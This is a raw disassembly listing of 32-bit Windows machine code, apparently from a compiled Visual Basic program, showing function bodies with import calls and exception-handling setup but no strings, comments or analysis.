  404e84:	c7 45 fc 15 00 00 00 	movl   $0x15,-0x4(%ebp)
  404e8b:	6a 00                	push   $0x0
  404e8d:	6a 00                	push   $0x0
  404e8f:	ff 15 00 10 40 00    	call   *0x401000
  404e95:	8b d0                	mov    %eax,%edx
  404e97:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404e9a:	ff 15 38 11 40 00    	call   *0x401138
  404ea0:	50                   	push   %eax
  404ea1:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404ea4:	51                   	push   %ecx
  404ea5:	ff 15 24 11 40 00    	call   *0x401124
  404eab:	50                   	push   %eax
  404eac:	6a 00                	push   $0x0
  404eae:	6a 00                	push   $0x0
  404eb0:	8b 55 b8             	mov    -0x48(%ebp),%edx
  404eb3:	52                   	push   %edx
  404eb4:	e8 0b dd ff ff       	call   0x402bc4
  404eb9:	66 89 85 3c ff ff ff 	mov    %ax,-0xc4(%ebp)
  404ec0:	ff 15 34 10 40 00    	call   *0x401034
  404ec6:	0f bf 85 3c ff ff ff 	movswl -0xc4(%ebp),%eax
  404ecd:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404ed0:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404ed3:	51                   	push   %ecx
  404ed4:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404ed7:	52                   	push   %edx
  404ed8:	6a 02                	push   $0x2
  404eda:	ff 15 08 11 40 00    	call   *0x401108
  404ee0:	83 c4 0c             	add    $0xc,%esp
  404ee3:	e9 2f 03 00 00       	jmp    0x405217
  404ee8:	c7 45 fc 16 00 00 00 	movl   $0x16,-0x4(%ebp)
  404eef:	8b 85 1c ff ff ff    	mov    -0xe4(%ebp),%eax
  404ef5:	50                   	push   %eax
  404ef6:	68 c4 31 40 00       	push   $0x4031c4
  404efb:	ff 15 84 10 40 00    	call   *0x401084
  404f01:	85 c0                	test   %eax,%eax
  404f03:	0f 85 0e 03 00 00    	jne    0x405217
  404f09:	c7 45 fc 17 00 00 00 	movl   $0x17,-0x4(%ebp)
  404f10:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  404f13:	51                   	push   %ecx
  404f14:	ff 15 14 10 40 00    	call   *0x401014
  404f1a:	83 e8 01             	sub    $0x1,%eax
  404f1d:	0f 80 30 05 00 00    	jo     0x405453
  404f23:	89 45 88             	mov    %eax,-0x78(%ebp)
  404f26:	c7 45 80 03 00 00 00 	movl   $0x3,-0x80(%ebp)
  404f2d:	8d 55 c8             	lea    -0x38(%ebp),%edx
  404f30:	89 95 58 ff ff ff    	mov    %edx,-0xa8(%ebp)
  404f36:	c7 85 50 ff ff ff 08 	movl   $0x4008,-0xb0(%ebp)
  404f3d:	40 00 00 
  404f40:	8d 45 80             	lea    -0x80(%ebp),%eax
  404f43:	50                   	push   %eax
  404f44:	6a 01                	push   $0x1
  404f46:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  404f4c:	51                   	push   %ecx
  404f4d:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  404f53:	52                   	push   %edx
  404f54:	ff 15 6c 10 40 00    	call   *0x40106c
  404f5a:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  404f60:	50                   	push   %eax
  404f61:	ff 15 10 10 40 00    	call   *0x401010
  404f67:	8b d0                	mov    %eax,%edx
  404f69:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404f6c:	ff 15 38 11 40 00    	call   *0x401138
  404f72:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404f78:	51                   	push   %ecx
  404f79:	8d 55 80             	lea    -0x80(%ebp),%edx
  404f7c:	52                   	push   %edx
  404f7d:	6a 02                	push   $0x2
  404f7f:	ff 15 18 10 40 00    	call   *0x401018
  404f85:	83 c4 0c             	add    $0xc,%esp
  404f88:	c7 45 fc 18 00 00 00 	movl   $0x18,-0x4(%ebp)
  404f8f:	ba d4 31 40 00       	mov    $0x4031d4,%edx
  404f94:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404f97:	ff 15 00 11 40 00    	call   *0x401100
  404f9d:	ba 58 26 40 00       	mov    $0x402658,%edx
  404fa2:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404fa5:	ff 15 00 11 40 00    	call   *0x401100
  404fab:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  404fae:	50                   	push   %eax
  404faf:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404fb2:	51                   	push   %ecx
  404fb3:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404fb6:	52                   	push   %edx
  404fb7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404fba:	50                   	push   %eax
  404fbb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404fbe:	8b 11                	mov    (%ecx),%edx
  404fc0:	8b 45 08             	mov    0x8(%ebp),%eax
  404fc3:	50                   	push   %eax
  404fc4:	ff 92 f8 06 00 00    	call   *0x6f8(%edx)
  404fca:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  404fd0:	83 bd 2c ff ff ff 00 	cmpl   $0x0,-0xd4(%ebp)
  404fd7:	7d 23                	jge    0x404ffc
  404fd9:	68 f8 06 00 00       	push   $0x6f8
  404fde:	68 54 27 40 00       	push   $0x402754
  404fe3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404fe6:	51                   	push   %ecx
  404fe7:	8b 95 2c ff ff ff    	mov    -0xd4(%ebp),%edx
  404fed:	52                   	push   %edx
  404fee:	ff 15 38 10 40 00    	call   *0x401038
  404ff4:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  404ffa:	eb 0a                	jmp    0x405006
  404ffc:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
  405003:	00 00 00 
  405006:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  405009:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40500f:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%ebp)
  405016:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  40501c:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40501f:	ff 15 38 11 40 00    	call   *0x401138
  405025:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  405028:	51                   	push   %ecx
  405029:	8d 55 ac             	lea    -0x54(%ebp),%edx
  40502c:	52                   	push   %edx
  40502d:	6a 02                	push   $0x2
  40502f:	ff 15 08 11 40 00    	call   *0x401108
  405035:	83 c4 0c             	add    $0xc,%esp
  405038:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  40503f:	6a 00                	push   $0x0
  405041:	6a 00                	push   $0x0
  405043:	6a 00                	push   $0x0
  405045:	6a 00                	push   $0x0
  405047:	68 8c 26 40 00       	push   $0x40268c
  40504c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40504f:	50                   	push   %eax
  405050:	ff 15 24 11 40 00    	call   *0x401124
  405056:	50                   	push   %eax
  405057:	e8 38 da ff ff       	call   0x402a94
  40505c:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  405062:	ff 15 34 10 40 00    	call   *0x401034
  405068:	8b 8d 38 ff ff ff    	mov    -0xc8(%ebp),%ecx
  40506e:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405071:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  405074:	ff 15 64 11 40 00    	call   *0x401164
  40507a:	c7 45 fc 1a 00 00 00 	movl   $0x1a,-0x4(%ebp)
  405081:	6a 00                	push   $0x0
  405083:	6a 00                	push   $0x0
  405085:	6a 03                	push   $0x3
  405087:	68 74 31 40 00       	push   $0x403174
  40508c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40508f:	52                   	push   %edx
  405090:	ff 15 24 11 40 00    	call   *0x401124
  405096:	50                   	push   %eax
  405097:	68 74 31 40 00       	push   $0x403174
  40509c:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40509f:	50                   	push   %eax
  4050a0:	ff 15 24 11 40 00    	call   *0x401124
  4050a6:	50                   	push   %eax
  4050a7:	6a 50                	push   $0x50
  4050a9:	68 58 26 40 00       	push   $0x402658
  4050ae:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4050b1:	51                   	push   %ecx
  4050b2:	ff 15 24 11 40 00    	call   *0x401124
  4050b8:	50                   	push   %eax
  4050b9:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4050bc:	52                   	push   %edx
  4050bd:	e8 1e da ff ff       	call   0x402ae0
  4050c2:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  4050c8:	ff 15 34 10 40 00    	call   *0x401034
  4050ce:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  4050d4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4050d7:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4050da:	51                   	push   %ecx
  4050db:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4050de:	52                   	push   %edx
  4050df:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4050e2:	50                   	push   %eax
  4050e3:	6a 03                	push   $0x3
  4050e5:	ff 15 08 11 40 00    	call   *0x401108
  4050eb:	83 c4 10             	add    $0x10,%esp
  4050ee:	c7 45 fc 1b 00 00 00 	movl   $0x1b,-0x4(%ebp)
  4050f5:	6a 00                	push   $0x0
  4050f7:	68 00 00 00 80       	push   $0x80000000
  4050fc:	6a 00                	push   $0x0
  4050fe:	6a 00                	push   $0x0
  405100:	68 00 2f 40 00       	push   $0x402f00
  405105:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  405108:	51                   	push   %ecx
  405109:	ff 15 24 11 40 00    	call   *0x401124
  40510f:	50                   	push   %eax
  405110:	68 88 31 40 00       	push   $0x403188
  405115:	68 b0 31 40 00       	push   $0x4031b0
  40511a:	ff 15 28 10 40 00    	call   *0x401028
  405120:	8b d0                	mov    %eax,%edx
  405122:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  405125:	ff 15 38 11 40 00    	call   *0x401138
  40512b:	50                   	push   %eax
  40512c:	8b 55 08             	mov    0x8(%ebp),%edx
  40512f:	8b 42 38             	mov    0x38(%edx),%eax
  405132:	50                   	push   %eax
  405133:	ff 15 28 10 40 00    	call   *0x401028
  405139:	8b d0                	mov    %eax,%edx
  40513b:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40513e:	ff 15 38 11 40 00    	call   *0x401138
  405144:	50                   	push   %eax
  405145:	68 54 31 40 00       	push   $0x403154
  40514a:	ff 15 28 10 40 00    	call   *0x401028
  405150:	8b d0                	mov    %eax,%edx
  405152:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  405155:	ff 15 38 11 40 00    	call   *0x401138
  40515b:	50                   	push   %eax
  40515c:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40515f:	51                   	push   %ecx
  405160:	ff 15 24 11 40 00    	call   *0x401124
  405166:	50                   	push   %eax
  405167:	68 7c 31 40 00       	push   $0x40317c
  40516c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40516f:	52                   	push   %edx
  405170:	ff 15 24 11 40 00    	call   *0x401124
  405176:	50                   	push   %eax
  405177:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40517a:	50                   	push   %eax
  40517b:	e8 f8 d9 ff ff       	call   0x402b78
  405180:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  405186:	ff 15 34 10 40 00    	call   *0x401034
  40518c:	8b 8d 38 ff ff ff    	mov    -0xc8(%ebp),%ecx
  405192:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  405195:	8d 55 98             	lea    -0x68(%ebp),%edx
  405198:	52                   	push   %edx
  405199:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40519c:	50                   	push   %eax
  40519d:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4051a0:	51                   	push   %ecx
  4051a1:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  4051a4:	52                   	push   %edx
  4051a5:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4051a8:	50                   	push   %eax
  4051a9:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4051ac:	51                   	push   %ecx
  4051ad:	6a 06                	push   $0x6
  4051af:	ff 15 08 11 40 00    	call   *0x401108
  4051b5:	83 c4 1c             	add    $0x1c,%esp
  4051b8:	c7 45 fc 1c 00 00 00 	movl   $0x1c,-0x4(%ebp)
  4051bf:	6a 00                	push   $0x0
  4051c1:	6a 00                	push   $0x0
  4051c3:	ff 15 00 10 40 00    	call   *0x401000
  4051c9:	8b d0                	mov    %eax,%edx
  4051cb:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4051ce:	ff 15 38 11 40 00    	call   *0x401138
  4051d4:	50                   	push   %eax
  4051d5:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4051d8:	52                   	push   %edx
  4051d9:	ff 15 24 11 40 00    	call   *0x401124
  4051df:	50                   	push   %eax
  4051e0:	6a 00                	push   $0x0
  4051e2:	6a 00                	push   $0x0
  4051e4:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4051e7:	50                   	push   %eax
  4051e8:	e8 d7 d9 ff ff       	call   0x402bc4
  4051ed:	66 89 85 3c ff ff ff 	mov    %ax,-0xc4(%ebp)
  4051f4:	ff 15 34 10 40 00    	call   *0x401034
  4051fa:	0f bf 8d 3c ff ff ff 	movswl -0xc4(%ebp),%ecx
  405201:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  405204:	8d 55 a8             	lea    -0x58(%ebp),%edx
  405207:	52                   	push   %edx
  405208:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40520b:	50                   	push   %eax
  40520c:	6a 02                	push   $0x2
  40520e:	ff 15 08 11 40 00    	call   *0x401108
  405214:	83 c4 0c             	add    $0xc,%esp
  405217:	c7 45 fc 1e 00 00 00 	movl   $0x1e,-0x4(%ebp)
  40521e:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  405221:	51                   	push   %ecx
  405222:	e8 e9 d9 ff ff       	call   0x402c10
  405227:	ff 15 34 10 40 00    	call   *0x401034
  40522d:	c7 45 fc 1f 00 00 00 	movl   $0x1f,-0x4(%ebp)
  405234:	8b 55 c0             	mov    -0x40(%ebp),%edx
  405237:	52                   	push   %edx
  405238:	e8 d3 d9 ff ff       	call   0x402c10
  40523d:	ff 15 34 10 40 00    	call   *0x401034
  405243:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%ebp)
  40524a:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40524d:	50                   	push   %eax
  40524e:	e8 bd d9 ff ff       	call   0x402c10
  405253:	ff 15 34 10 40 00    	call   *0x401034
  405259:	e9 43 01 00 00       	jmp    0x4053a1
  40525e:	c7 45 fc 22 00 00 00 	movl   $0x22,-0x4(%ebp)
  405265:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405268:	8b 11                	mov    (%ecx),%edx
  40526a:	8b 45 08             	mov    0x8(%ebp),%eax
  40526d:	50                   	push   %eax
  40526e:	ff 92 10 03 00 00    	call   *0x310(%edx)
  405274:	50                   	push   %eax
  405275:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  405278:	51                   	push   %ecx
  405279:	ff 15 50 10 40 00    	call   *0x401050
  40527f:	89 85 24 ff ff ff    	mov    %eax,-0xdc(%ebp)
  405285:	8b 55 08             	mov    0x8(%ebp),%edx
  405288:	8b 02                	mov    (%edx),%eax
  40528a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40528d:	51                   	push   %ecx
  40528e:	ff 90 10 03 00 00    	call   *0x310(%eax)
  405294:	50                   	push   %eax
  405295:	8d 55 94             	lea    -0x6c(%ebp),%edx
  405298:	52                   	push   %edx
  405299:	ff 15 50 10 40 00    	call   *0x401050
  40529f:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  4052a5:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4052a8:	50                   	push   %eax
  4052a9:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  4052af:	8b 11                	mov    (%ecx),%edx
  4052b1:	8b 85 2c ff ff ff    	mov    -0xd4(%ebp),%eax
  4052b7:	50                   	push   %eax
  4052b8:	ff 52 50             	call   *0x50(%edx)
  4052bb:	db e2                	fnclex
  4052bd:	89 85 28 ff ff ff    	mov    %eax,-0xd8(%ebp)
  4052c3:	83 bd 28 ff ff ff 00 	cmpl   $0x0,-0xd8(%ebp)
  4052ca:	7d 23                	jge    0x4052ef
  4052cc:	6a 50                	push   $0x50
  4052ce:	68 24 31 40 00       	push   $0x403124
  4052d3:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  4052d9:	51                   	push   %ecx
  4052da:	8b 95 28 ff ff ff    	mov    -0xd8(%ebp),%edx
  4052e0:	52                   	push   %edx
  4052e1:	ff 15 38 10 40 00    	call   *0x401038
  4052e7:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  4052ed:	eb 0a                	jmp    0x4052f9
  4052ef:	c7 85 f0 fe ff ff 00 	movl   $0x0,-0x110(%ebp)
  4052f6:	00 00 00 
  4052f9:	8b 45 ac             	mov    -0x54(%ebp),%eax
  4052fc:	50                   	push   %eax
  4052fd:	ff 15 68 11 40 00    	call   *0x401168
  405303:	dc 05 08 13 40 00    	faddl  0x401308
  405309:	df e0                	fnstsw %ax
  40530b:	a8 0d                	test   $0xd,%al
  40530d:	0f 85 3b 01 00 00    	jne    0x40544e
  405313:	83 ec 08             	sub    $0x8,%esp
  405316:	dd 1c 24             	fstpl  (%esp)
  405319:	ff 15 9c 10 40 00    	call   *0x40109c
  40531f:	8b d0                	mov    %eax,%edx
  405321:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  405324:	ff 15 38 11 40 00    	call   *0x401138
  40532a:	50                   	push   %eax
  40532b:	8b 8d 24 ff ff ff    	mov    -0xdc(%ebp),%ecx
  405331:	8b 11                	mov    (%ecx),%edx
  405333:	8b 85 24 ff ff ff    	mov    -0xdc(%ebp),%eax
  405339:	50                   	push   %eax
  40533a:	ff 52 54             	call   *0x54(%edx)
  40533d:	db e2                	fnclex
  40533f:	89 85 20 ff ff ff    	mov    %eax,-0xe0(%ebp)
  405345:	83 bd 20 ff ff ff 00 	cmpl   $0x0,-0xe0(%ebp)
  40534c:	7d 23                	jge    0x405371
  40534e:	6a 54                	push   $0x54
  405350:	68 24 31 40 00       	push   $0x403124
  405355:	8b 8d 24 ff ff ff    	mov    -0xdc(%ebp),%ecx
  40535b:	51                   	push   %ecx
  40535c:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  405362:	52                   	push   %edx
  405363:	ff 15 38 10 40 00    	call   *0x401038
  405369:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  40536f:	eb 0a                	jmp    0x40537b
  405371:	c7 85 ec fe ff ff 00 	movl   $0x0,-0x114(%ebp)
  405378:	00 00 00 
  40537b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40537e:	50                   	push   %eax
  40537f:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  405382:	51                   	push   %ecx
  405383:	6a 02                	push   $0x2
  405385:	ff 15 08 11 40 00    	call   *0x401108
  40538b:	83 c4 0c             	add    $0xc,%esp
  40538e:	8d 55 90             	lea    -0x70(%ebp),%edx
  405391:	52                   	push   %edx
  405392:	8d 45 94             	lea    -0x6c(%ebp),%eax
  405395:	50                   	push   %eax
  405396:	6a 02                	push   $0x2
  405398:	ff 15 20 10 40 00    	call   *0x401020
  40539e:	83 c4 0c             	add    $0xc,%esp
  4053a1:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4053a8:	9b                   	fwait
  4053a9:	68 2c 54 40 00       	push   $0x40542c
  4053ae:	eb 54                	jmp    0x405404
  4053b0:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4053b3:	51                   	push   %ecx
  4053b4:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4053b7:	52                   	push   %edx
  4053b8:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4053bb:	50                   	push   %eax
  4053bc:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4053bf:	51                   	push   %ecx
  4053c0:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4053c3:	52                   	push   %edx
  4053c4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4053c7:	50                   	push   %eax
  4053c8:	6a 06                	push   $0x6
  4053ca:	ff 15 08 11 40 00    	call   *0x401108
  4053d0:	83 c4 1c             	add    $0x1c,%esp
  4053d3:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4053d6:	51                   	push   %ecx
  4053d7:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4053da:	52                   	push   %edx
  4053db:	6a 02                	push   $0x2
  4053dd:	ff 15 20 10 40 00    	call   *0x401020
  4053e3:	83 c4 0c             	add    $0xc,%esp
  4053e6:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4053ec:	50                   	push   %eax
  4053ed:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4053f3:	51                   	push   %ecx
  4053f4:	8d 55 80             	lea    -0x80(%ebp),%edx
  4053f7:	52                   	push   %edx
  4053f8:	6a 03                	push   $0x3
  4053fa:	ff 15 18 10 40 00    	call   *0x401018
  405400:	83 c4 10             	add    $0x10,%esp
  405403:	c3                   	ret
  405404:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  40540a:	ff 15 64 11 40 00    	call   *0x401164
  405410:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405413:	ff 15 64 11 40 00    	call   *0x401164
  405419:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40541c:	ff 15 64 11 40 00    	call   *0x401164
  405422:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  405425:	ff 15 64 11 40 00    	call   *0x401164
  40542b:	c3                   	ret
  40542c:	8b 45 08             	mov    0x8(%ebp),%eax
  40542f:	8b 08                	mov    (%eax),%ecx
  405431:	8b 55 08             	mov    0x8(%ebp),%edx
  405434:	52                   	push   %edx
  405435:	ff 51 08             	call   *0x8(%ecx)
  405438:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40543b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40543e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405445:	5f                   	pop    %edi
  405446:	5e                   	pop    %esi
  405447:	5b                   	pop    %ebx
  405448:	8b e5                	mov    %ebp,%esp
  40544a:	5d                   	pop    %ebp
  40544b:	c2 04 00             	ret    $0x4
  40544e:	e9 59 c0 ff ff       	jmp    0x4014ac
  405453:	ff 15 e0 10 40 00    	call   *0x4010e0
  405459:	cc                   	int3
  40545a:	cc                   	int3
  40545b:	cc                   	int3
  40545c:	cc                   	int3
  40545d:	cc                   	int3
  40545e:	cc                   	int3
  40545f:	cc                   	int3
  405460:	55                   	push   %ebp
  405461:	8b ec                	mov    %esp,%ebp
  405463:	83 ec 18             	sub    $0x18,%esp
  405466:	68 a6 14 40 00       	push   $0x4014a6
  40546b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405471:	50                   	push   %eax
  405472:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405479:	b8 84 01 00 00       	mov    $0x184,%eax
  40547e:	e8 1d c0 ff ff       	call   0x4014a0
  405483:	53                   	push   %ebx
  405484:	56                   	push   %esi
  405485:	57                   	push   %edi
  405486:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405489:	c7 45 ec 18 13 40 00 	movl   $0x401318,-0x14(%ebp)
  405490:	8b 45 08             	mov    0x8(%ebp),%eax
  405493:	83 e0 01             	and    $0x1,%eax
  405496:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405499:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40549c:	83 e1 fe             	and    $0xfffffffe,%ecx
  40549f:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4054a2:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4054a9:	8b 55 08             	mov    0x8(%ebp),%edx
  4054ac:	8b 02                	mov    (%edx),%eax
  4054ae:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4054b1:	51                   	push   %ecx
  4054b2:	ff 50 04             	call   *0x4(%eax)
  4054b5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4054bc:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4054c3:	6a ff                	push   $0xffffffff
  4054c5:	ff 15 4c 10 40 00    	call   *0x40104c
  4054cb:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4054d2:	8d 55 a0             	lea    -0x60(%ebp),%edx
  4054d5:	52                   	push   %edx
  4054d6:	ff 15 1c 11 40 00    	call   *0x40111c
  4054dc:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4054df:	50                   	push   %eax
  4054e0:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4054e3:	51                   	push   %ecx
  4054e4:	ff 15 40 11 40 00    	call   *0x401140
  4054ea:	8d 55 80             	lea    -0x80(%ebp),%edx
  4054ed:	52                   	push   %edx
  4054ee:	ff 15 1c 11 40 00    	call   *0x40111c
  4054f4:	8d 45 80             	lea    -0x80(%ebp),%eax
  4054f7:	50                   	push   %eax
  4054f8:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4054fe:	51                   	push   %ecx
  4054ff:	ff 15 50 11 40 00    	call   *0x401150
  405505:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40550b:	52                   	push   %edx
  40550c:	ff 15 1c 11 40 00    	call   *0x40111c
  405512:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  405518:	50                   	push   %eax
  405519:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  40551f:	51                   	push   %ecx
  405520:	ff 15 30 10 40 00    	call   *0x401030
  405526:	c7 85 88 fe ff ff f0 	movl   $0x4031f0,-0x178(%ebp)
  40552d:	31 40 00 
  405530:	c7 85 80 fe ff ff 08 	movl   $0x8,-0x180(%ebp)
  405537:	00 00 00 
  40553a:	8d 95 10 ff ff ff    	lea    -0xf0(%ebp),%edx
  405540:	52                   	push   %edx
  405541:	ff 15 28 11 40 00    	call   *0x401128
  405547:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  40554d:	50                   	push   %eax
  40554e:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405554:	51                   	push   %ecx
  405555:	ff 15 44 11 40 00    	call   *0x401144
  40555b:	8d 95 e0 fe ff ff    	lea    -0x120(%ebp),%edx
  405561:	52                   	push   %edx
  405562:	ff 15 28 11 40 00    	call   *0x401128
  405568:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40556e:	50                   	push   %eax
  40556f:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  405575:	51                   	push   %ecx
  405576:	ff 15 4c 11 40 00    	call   *0x40114c
  40557c:	8d 95 b0 fe ff ff    	lea    -0x150(%ebp),%edx
  405582:	52                   	push   %edx
  405583:	ff 15 28 11 40 00    	call   *0x401128
  405589:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  40558f:	50                   	push   %eax
  405590:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  405596:	51                   	push   %ecx
  405597:	ff 15 58 11 40 00    	call   *0x401158
  40559d:	8d 55 90             	lea    -0x70(%ebp),%edx
  4055a0:	52                   	push   %edx
  4055a1:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4055a7:	50                   	push   %eax
  4055a8:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4055ae:	51                   	push   %ecx
  4055af:	ff 15 d0 10 40 00    	call   *0x4010d0
  4055b5:	50                   	push   %eax
  4055b6:	8d 95 40 ff ff ff    	lea    -0xc0(%ebp),%edx
  4055bc:	52                   	push   %edx
  4055bd:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  4055c3:	50                   	push   %eax
  4055c4:	ff 15 d0 10 40 00    	call   *0x4010d0
  4055ca:	50                   	push   %eax
  4055cb:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  4055d1:	51                   	push   %ecx
  4055d2:	8d 95 20 ff ff ff    	lea    -0xe0(%ebp),%edx
  4055d8:	52                   	push   %edx
  4055d9:	ff 15 d0 10 40 00    	call   *0x4010d0
  4055df:	50                   	push   %eax
  4055e0:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4055e6:	50                   	push   %eax
  4055e7:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  4055ed:	51                   	push   %ecx
  4055ee:	ff 15 d0 10 40 00    	call   *0x4010d0
  4055f4:	50                   	push   %eax
  4055f5:	8d 95 d0 fe ff ff    	lea    -0x130(%ebp),%edx
  4055fb:	52                   	push   %edx
  4055fc:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  405602:	50                   	push   %eax
  405603:	ff 15 d0 10 40 00    	call   *0x4010d0
  405609:	50                   	push   %eax
  40560a:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  405610:	51                   	push   %ecx
  405611:	8d 95 90 fe ff ff    	lea    -0x170(%ebp),%edx
  405617:	52                   	push   %edx
  405618:	ff 15 d0 10 40 00    	call   *0x4010d0
  40561e:	50                   	push   %eax
  40561f:	ff 15 10 10 40 00    	call   *0x401010
  405625:	8b d0                	mov    %eax,%edx
  405627:	8d 4d dc             	lea    -0x24(%ebp),%ecx
